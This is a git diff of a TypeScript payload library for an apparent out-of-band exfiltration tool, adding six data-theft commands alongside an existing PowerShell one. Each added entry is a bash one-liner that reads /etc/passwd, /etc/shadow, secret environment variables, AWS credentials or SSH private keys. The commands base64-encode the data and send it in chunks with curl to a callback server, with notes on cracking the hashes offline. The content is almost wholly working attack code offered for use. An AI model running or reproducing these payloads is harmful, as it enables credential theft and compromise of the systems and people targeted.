@@ -363,6 +363,86 @@ export function buildDnsExfil(cbUrl: string, token: string): ExfilPayload[] {
       command: `powershell -NonI -W Hidden -c "$d=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-ChildItem Env:|Out-String)));for($i=0;$i -lt $d.Length;$i+=55){$c=$d.Substring($i,[Math]::Min(55,$d.Length-$i));nslookup \"$c.$i.w.${token}.${host}\" 8.8.8.8 2>$null;Start-Sleep -Milliseconds 150}"`,
       notes: "PowerShell env exfil over DNS in 55-char chunks. No curl/wget needed.",
     },
+
+    /* ── HTTP-routed DNS chunk payloads (reassembled server-side in real-time) ── */
+    {
+      id: "dns_http_passwd", name: "/etc/passwd — HTTP DNS-chunk (live reassembly)", category: "Credentials",
+      technique: "dns", os: "linux",
+      command:
+        `f=$(base64 -w0 /etc/passwd 2>/dev/null||base64 /etc/passwd|tr -d '\\n'); ` +
+        `n=${`\${#f}`}; t=$(( (n+54)/55 )); i=0; idx=0; ` +
+        `while [ $i -lt $n ]; do ` +
+          `chunk=${`\${f:$i:55}`}; ` +
+          `curl -sk "${cbUrl.replace(/\/oob\/cb$/, "/oob/dns-chunk")}/${token}/p/$idx/$t?d=$chunk" >/dev/null 2>&1; ` +
+          `i=$((i+55)); idx=$((idx+1)); sleep 0.05; ` +
+        `done`,
+      notes: "Chunks /etc/passwd as base64 over HTTP — server reassembles chunks into the full file in real-time. Monitor in DNS CHUNKS tab.",
+    },
+    {
+      id: "dns_http_env_secrets", name: "ENV Secrets — HTTP DNS-chunk (live reassembly)", category: "Secrets",
+      technique: "dns", os: "linux",
+      command:
+        `f=$(env|grep -iE '(pass|secret|key|token|api|cred|auth|db|database|jwt|bearer|hmac|signing|encrypt|salt|session|cookie)'|base64 -w0 2>/dev/null); ` +
+        `n=${`\${#f}`}; t=$(( (n+54)/55 )); i=0; idx=0; ` +
+        `while [ $i -lt $n ]; do ` +
+          `chunk=${`\${f:$i:55}`}; ` +
+          `curl -sk "${cbUrl.replace(/\/oob\/cb$/, "/oob/dns-chunk")}/${token}/e/$idx/$t?d=$chunk" >/dev/null 2>&1; ` +
+          `i=$((i+55)); idx=$((idx+1)); sleep 0.05; ` +
+        `done`,
+      notes: "Filters high-value env vars, sends as HTTP DNS-chunks. Server reassembles automatically.",
+    },
+    {
+      id: "dns_http_shadow", name: "/etc/shadow — HTTP DNS-chunk (root)", category: "Credentials",
+      technique: "dns", os: "linux",
+      command:
+        `f=$(sudo base64 -w0 /etc/shadow 2>/dev/null||base64 -w0 /etc/shadow 2>/dev/null); ` +
+        `n=${`\${#f}`}; t=$(( (n+54)/55 )); i=0; idx=0; ` +
+        `while [ $i -lt $n ]; do ` +
+          `chunk=${`\${f:$i:55}`}; ` +
+          `curl -sk "${cbUrl.replace(/\/oob\/cb$/, "/oob/dns-chunk")}/${token}/s/$idx/$t?d=$chunk" >/dev/null 2>&1; ` +
+          `i=$((i+55)); idx=$((idx+1)); sleep 0.05; ` +
+        `done`,
+      notes: "Requires root. /etc/shadow hash reassembly via HTTP DNS-chunks. Run hashcat/john offline on result.",
+    },
+    {
+      id: "dns_http_aws", name: "AWS Credentials — HTTP DNS-chunk (live reassembly)", category: "Cloud",
+      technique: "dns", os: "linux",
+      command:
+        `f=$(cat ~/.aws/credentials 2>/dev/null; env|grep -iE '^AWS_'|cat)|base64 -w0 2>/dev/null; ` +
+        `n=${`\${#f}`}; t=$(( (n+54)/55 )); i=0; idx=0; ` +
+        `while [ $i -lt $n ]; do ` +
+          `chunk=${`\${f:$i:55}`}; ` +
+          `curl -sk "${cbUrl.replace(/\/oob\/cb$/, "/oob/dns-chunk")}/${token}/aws/$idx/$t?d=$chunk" >/dev/null 2>&1; ` +
+          `i=$((i+55)); idx=$((idx+1)); sleep 0.05; ` +
+        `done`,
+      notes: "AWS credentials file + env vars chunked over HTTP. Server reassembles the full credentials for offline use.",
+    },
+    {
+      id: "dns_http_ssh_keys", name: "SSH Private Keys — HTTP DNS-chunk", category: "Credentials",
+      technique: "dns", os: "linux",
+      command:
+        `f=$(find /root /home ~/.ssh 2>/dev/null -maxdepth 4 \\( -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' \\) 2>/dev/null|while read k; do echo "=== $k ==="; cat "$k" 2>/dev/null; done|base64 -w0 2>/dev/null); ` +
+        `n=${`\${#f}`}; t=$(( (n+54)/55 )); i=0; idx=0; ` +
+        `while [ $i -lt $n ]; do ` +
+          `chunk=${`\${f:$i:55}`}; ` +
+          `curl -sk "${cbUrl.replace(/\/oob\/cb$/, "/oob/dns-chunk")}/${token}/ssh/$idx/$t?d=$chunk" >/dev/null 2>&1; ` +
+          `i=$((i+55)); idx=$((idx+1)); sleep 0.05; ` +
+        `done`,
+      notes: "All SSH private keys chunked over HTTP. Server reassembles into downloadable key bundle.",
+    },
+    {
+      id: "dns_http_mass", name: "MASS — HTTP DNS-chunk everything at once", category: "Mass",
+      technique: "dns", os: "linux",
+      command:
+        `f=$({ id; uname -a; hostname; env; cat /etc/passwd /etc/shadow 2>/dev/null; cat ~/.aws/credentials 2>/dev/null; env|grep -iE '^AWS_'; cat ~/.bash_history 2>/dev/null|tail -50; }|base64 -w0 2>/dev/null); ` +
+        `n=${`\${#f}`}; t=$(( (n+54)/55 )); i=0; idx=0; ` +
+        `while [ $i -lt $n ]; do ` +
+          `chunk=${`\${f:$i:55}`}; ` +
+          `curl -sk "${cbUrl.replace(/\/oob\/cb$/, "/oob/dns-chunk")}/${token}/m/$idx/$t?d=$chunk" >/dev/null 2>&1; ` +
+          `i=$((i+55)); idx=$((idx+1)); sleep 0.03; ` +
+        `done`,
+      notes: "All high-value targets in one chunked HTTP stream. Largest payload — server assembles full dump.",
+    },
   ];
 }
 
